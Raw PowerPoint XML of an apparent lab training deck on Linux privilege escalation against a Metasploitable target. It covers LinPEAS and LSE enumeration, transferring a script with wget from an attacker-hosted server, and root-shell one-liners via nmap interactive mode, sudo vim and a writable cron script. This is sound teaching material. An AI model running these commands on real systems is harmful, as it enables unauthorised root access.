                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>./linpeas.sh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+mj-lt"/>
              </a:rPr>
              <a:t>What </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Scans For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+mj-lt"/>
              </a:rPr>
              <a:t>SUDO Misconfigurations</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Commands that can be executed as root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978266"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5624946" y="3468193"/>
          <a:ext cx="51689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8365">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1595165224"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2420535">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="635688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7410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Download LinPEAS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Kali Linux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74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Host file (HTTP server)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Kali Linux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547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Download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Metasploitable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6410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Run </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>LinPEAS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Metasploitable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90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Analyze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Metasploitable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5359264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24946" y="147288"/>
            <a:ext cx="6096000" cy="416421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+mj-lt"/>
              </a:rPr>
              <a:t>SUID Binaries</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Programs running with elevated (root) privileges </a:t>
            </a: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+mj-lt"/>
              </a:rPr>
              <a:t>Done on: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> (Target Machine)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRP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70C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ls -l /bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>passwd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" b="1" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRP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+mj-lt"/>
              </a:rPr>
              <a:t>Example Output:</a:t>
            </a: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j-lt"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>rwsr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>xr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>-x 1 root </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 54256 Jan 1 /bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>passwd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRP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j-lt"/>
              </a:rPr>
              <a:t>👉 Notice the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> in place of x:</a:t>
            </a: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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>rws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> → SUID is enabled </a:t>
            </a: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+mj-lt"/>
              </a:rPr>
              <a:t>Owner = root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6197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4835236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How to Find SUID Binaries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Done on: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (Target Machine)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solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>find / -perm -4000 2&gt;/dev/null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It will shows us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Writable Files &amp; Directories</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Especially sensitive locations like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/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 err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Jobs</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Scheduled tasks that may be abused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Credentials &amp; Passwords</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Hardcoded or stored in files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Environment Variables &amp; PATH Issues</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Misconfigurations that can be exploited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Running Services &amp; Processes</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Services that may have vulnerabilities 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835236" y="43934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+mj-lt"/>
              </a:rPr>
              <a:t>Kernel Version Vulnerabilities</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Outdated kernels that may be exploitable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+mj-lt"/>
              </a:rPr>
              <a:t>User Permissions &amp; Groups</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Weak or misconfigured access controls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The output highlights </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>potential privilege escalation paths</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> that can be used to gain </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>root access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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0059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524"/>
            <a:ext cx="12192000" cy="7064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+mj-lt"/>
              </a:rPr>
              <a:t>Step 3 — Use Linux Smart Enumeration (LSE)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LSE.sh (Linux Smart Enumeration)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>post-exploitation enumeration script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> used after gaining access to a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 target machine.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+mj-lt"/>
              </a:rPr>
              <a:t>👉</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>It helps quickly identify:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Misconfigured permissions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>SUID/SGID binaries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Weak file permissions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Writable directories</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Possible </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>privilege escalation paths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Think of it as a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>clean and categorized alternative to LinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>, with risk levels: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🔴 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>High (very exploitable)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FFC000"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Medium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92D050"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Low</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr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8077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7495309" cy="6772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>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Done on: Kali Linux (Attacker Machine)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wget </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRP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🔸 Step 2 — Transfer LSE.sh to Target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Done on: Kali Linux → Metasploitable (Target Machine)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+mj-lt"/>
              </a:rPr>
              <a:t>Start a simple HTTP server on Kali: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+mj-lt"/>
              </a:rPr>
              <a:t>python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 8000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+mj-lt"/>
              </a:rPr>
              <a:t>👉 On Metasploitable (target), download the script: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+mj-lt"/>
              </a:rPr>
              <a:t>wget http://&lt;KALI_IP&gt;:8000/lse.sh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>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔸 Step 3 — Give Execute Permissions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>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Done on: Metasploitable (Target Machine)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Run it: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chmod +x lse.sh</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>./lse.sh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./lse.sh -l 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"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73091" y="293822"/>
            <a:ext cx="6096000" cy="503349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It highlights potential privilege escalation vectors.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j-lt"/>
              </a:rPr>
              <a:t>More detailed (recommended):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j-lt"/>
              </a:rPr>
              <a:t>The -l flag = level (verbosity / depth)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j-lt"/>
              </a:rPr>
              <a:t>./lse.sh -l 2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j-lt"/>
              </a:rPr>
              <a:t>👉 Full verbose mode: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j-lt"/>
              </a:rPr>
              <a:t>./lse.sh -l 3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Identify High-Value Sections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Look for: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🔴 SUID binaries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🔴 Writable files owned by root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🔴 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> jobs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🔴 Weak permissions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1698199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515600" cy="677227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+mj-lt"/>
              </a:rPr>
              <a:t>How to Find SUID Binaries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+mj-lt"/>
              </a:rPr>
              <a:t>Done on: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> (Target Machine)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0"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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>find / -perm -4000 2&gt;/dev/null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+mj-lt"/>
              </a:rPr>
              <a:t>If you see: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solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>[!]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>SUID files:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/local/bin/backup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+mj-lt"/>
              </a:rPr>
              <a:t>👉 Your job is simply to say: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+mj-lt"/>
              </a:rPr>
              <a:t>“This is a non-standard SUID binary → possible privilege escalation vector”</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>SUID binary detected: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+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/local/bin/backup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+mj-lt"/>
              </a:rPr>
              <a:t>Why Important:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0"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+mj-lt"/>
              </a:rPr>
              <a:t>Not a standard system binary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+mj-lt"/>
              </a:rPr>
              <a:t>Runs with root privileges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+mj-lt"/>
              </a:rPr>
              <a:t>May allow privilege escalation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27434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400282"/>
            <a:ext cx="11049000" cy="4265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+mj-lt"/>
              </a:rPr>
              <a:t>🔴 Step 3 — Exploit Identified Misconfiguration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Use the discovered vulnerability to gain root access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>👉 Example 1 — SUID binary (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>)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dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> --interactive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!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>sh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👉 Spawns a root shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>👉 Example 2 — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> misconfiguration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dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> vim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Then inside vim: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:!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>sh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👉 Escapes to root shell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+mj-lt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117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515600" cy="67310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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>👉 Example 3 — Writable file / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> job</a:t>
            </a:r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Scenario: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You find a writable script executed by root (e.g., via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt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cat /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>crontab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👉 Suppose it runs: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/usr/local/bin/backup.sh</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>If file is writable: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echo "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> +s /bin/bash" &gt;&gt; /usr/local/bin/backup.sh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👉 Wait for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> to execute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Then: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/bin/bash -p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👉 Root shell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1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</a:rPr>
              <a:t>Step 4 — Confirm Root Access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Check the current user again.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>whoami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Example output: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root</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="3200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4060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1"/>
            <a:ext cx="12630150" cy="68580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+mj-lt"/>
              </a:rPr>
              <a:t>Part 3 — Kernel Exploits (Last Resort)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A kernel exploit is a way to break the OS itself and force it to give you </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>root privileges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt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If no misconfigurations are found, check the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kernel version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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 1 — Check Kernel Version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Done on: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> (Target Machine </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt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shell 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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>uname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -a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Example output: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  <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Linux </a:t>
            </a:r>
            <a:r>
